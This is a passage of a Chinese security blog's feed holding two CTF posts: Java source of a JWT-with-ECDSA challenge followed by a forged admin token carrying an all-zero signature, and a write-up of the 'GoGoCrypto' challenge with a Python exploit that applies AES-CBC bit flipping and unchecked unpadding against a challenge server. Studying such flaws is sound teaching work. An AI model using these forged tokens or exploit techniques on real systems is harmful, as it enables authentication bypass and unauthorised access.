class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> KeyPair <span class="title function_">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="keyword">return</span> keyPair;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] sign(<span class="type">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initSign(privateKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="type">byte</span>[] sig = signature.sign();</span><br><span class="line">        <span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(<span class="type">byte</span>[] sig, <span class="type">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initVerify(publicKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jwt</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">EXPIRE</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">ECDSA</span> <span class="variable">ecdsa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ECDSA</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        header.put(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">        header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">        payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">        payload.put(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">        <span class="type">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> parts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> parts[<span class="number">2</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">            <span class="type">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line">            <span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadDecodeString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">        System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ecdsa.keyGen();</span><br><span class="line">        <span class="type">ECPrivateKey</span> <span class="variable">ecPrivateKey</span> <span class="operator">=</span> (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">ECPublicKey</span> <span class="variable">ecPublicKey</span> <span class="operator">=</span> (ECPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">String</span> <span class="variable">menu</span> <span class="operator">=</span> <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            System.out.print(menu);</span><br><span class="line">            choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> generateToken(user, ecPrivateKey);</span><br><span class="line">                System.out.println(token);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> getFlag(token, ecPublicKey, user);</span><br><span class="line">                System.out.println(flag);</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        task();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiV2Fua2tvIFJlZSIsImFkbWluIjp0cnVlLCJleHAiOjE3NTkzMjEzMjg0Mzh9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;ECDSA代表椭圆曲线数字签名算法，与旧的RS</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>GoGoCrypto_writeup</title>
    <link href="http://example.com/2023/12/27/GoGoCrypto-writeup/"/>
    <id>http://example.com/2023/12/27/GoGoCrypto-writeup/</id>
    <published>2023-12-26T16:10:28.000Z</published>
    <updated>2023-12-27T07:39:37.663Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>本人参与极客大挑战2023的出题工作，主要负责密码学板块。</p><p>对于GoGoCrypto这道反响比较高的题目，这里附上题解。</p><p><a href="https://github.com/AL3XEI709/Geek23/blob/main/GoGoCrypto/GoGoCrypto_setup.zip">题目源码</a></p><p>这题用Golang写了一个Flag Folder的交互，流程大概长这样：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270044077.png" alt="image-20231227004357980"></p><p>加解密采用的算法是AES的CBC mod。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270045335.png" alt="image-20231227004502286"></p><p>这种加密算法的主要攻击手段是<strong>字节翻转（bit flipping）</strong>，这种攻击的前提是一个明文分组是已知的。</p><p>sid是16字节，根据填充算法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := aes.BlockSize - (<span class="built_in">len</span>(pt) % aes.BlockSize)</span><br><span class="line">padding := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padlen)&#125;, padlen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(pt, padding...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道填充后有两块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block#1 block#2</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| sid | Padding (&quot;\x10&quot;*16) |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>那么我们就能修改第一个密文分组，来控制解密后的第</p><p>二个明文分组。具体的原理是：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270047773.png" alt="image-20231227004700688"></p><p>这一步显然会破坏第一块的明文，但并不影响我们的利用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unpad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := <span class="type">int</span>(pt[<span class="built_in">len</span>(pt)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">return</span> pt[:<span class="built_in">len</span>(pt)-padlen]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unpad函数只是将padding的最后一个字节作为padding长度，根本不检查，所以我们可以很容易的让padding长度为len(plaintext) - 1，那么我们就可以得到一个只有一个字节的明文了！</p><p>因此攻击流程是：</p><ul><li><p>修改密文并上传</p></li><li><p>服务端解密，得到只有一个字节的明文</p></li><li><p>遍历所有明文（254），必然得到flag。</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec, b64encode <span class="keyword">as</span> enc </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_request</span>(<span class="params">url, method=<span class="string">&#x27;GET&#x27;</span>, headers=<span class="literal">None</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method.upper() == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            response = requests.put(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            response = requests.delete(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unsupported HTTP method&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查请求是否成功</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">url = <span class="string">&#x27;http://47.109.106.62:7842/&#x27;</span> </span><br><span class="line">response = requests.get(url) </span><br><span class="line">x = <span class="built_in">str</span>(response.headers)</span><br><span class="line"></span><br><span class="line">token = unquote(x.split(<span class="string">&quot;token&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line">token = dec(token) </span><br><span class="line">nonce = unquote(x.split(<span class="string">&quot;nonce&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">c1, c2 = token[:<span class="built_in">len</span>(token)//<span class="number">2</span>], token[<span class="built_in">len</span>(token)//<span class="number">2</span>:] </span><br><span class="line">c1 = xor(xor(c1,<span class="string">b&#x27;\x10&#x27;</span>*<span class="number">16</span>),<span class="string">b&#x27;\x1f&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">form_data = &#123;</span><br><span class="line">    <span class="string">&quot;Rec&quot;</span>: enc(c1+c2).decode()</span><br><span class="line">&#125;</span><br><span class="line">res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/dec&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data) </span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: enc(<span class="built_in">chr</span>(i).encode()).decode()+enc(sha512(dec(nonce)).digest()).decode()</span><br><span class="line">    &#125;</span><br><span class="line">    res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/check&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SYC&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">        <span class="built_in">print</span>(res) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment"># &#123;&quot;check&quot;:&quot;true&quot;,&quot;msg&quot;:&quot;Your flag is: SYC&#123;AL3XEI_FAKE_FLAG&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;本人参与极客大挑战2023的出题工作，主要负责密码学板块。&lt;/p&gt;
&lt;p&gt;对于GoGoCrypto这道反响比较高的题目，这里附上题解。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
